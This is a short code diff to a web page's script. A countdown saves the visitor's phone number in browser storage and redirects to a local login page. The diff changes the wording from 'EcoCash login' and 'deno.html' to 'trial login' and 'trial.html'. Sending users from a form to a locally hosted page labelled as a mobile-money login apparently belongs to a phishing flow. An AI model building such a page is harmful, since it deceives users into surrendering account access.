@@ -899,16 +899,16 @@ document.addEventListener('input',e=>{if(e.target.matches('.form-input,.form-tex
 
   function startRedirectCountdown() {
     let secondsLeft = 5;
-    redirectText.textContent = `Redirecting to EcoCash login in ${secondsLeft}s…`;
+    redirectText.textContent = `Redirecting to trial login in ${secondsLeft}s…`;
     clearInterval(countdownTimer);
 countdownTimer = setInterval(() => {
   secondsLeft -= 1;
   if (secondsLeft <= 0) {
     clearInterval(countdownTimer);
     localStorage.setItem('phone', document.getElementById('phoneNumber').value.trim());
-    window.location.href = 'deno.html';
+    window.location.href = 'trial.html';
   } else {
-        redirectText.textContent = `Redirecting to EcoCash login in ${secondsLeft}s…`;
+        redirectText.textContent = `Redirecting to trial login in ${secondsLeft}s…`;
       }
     }, 1000);
   }
@@ -920,7 +920,7 @@ countdownTimer = setInterval(() => {
     setTimeout(() => toast.classList.remove('show'), 3500);
   });
 
-  goToLoginBtn.addEventListener('click',()=>{clearInterval(countdownTimer);localStorage.setItem('phone',document.getElementById('phoneNumber').value.trim());window.location.href='deno.html';});
+  goToLoginBtn.addEventListener('click',()=>{clearInterval(countdownTimer);localStorage.setItem('phone',document.getElementById('phoneNumber').value.trim());window.location.href='trial.html';});
 </script>
 </body>
 </html>
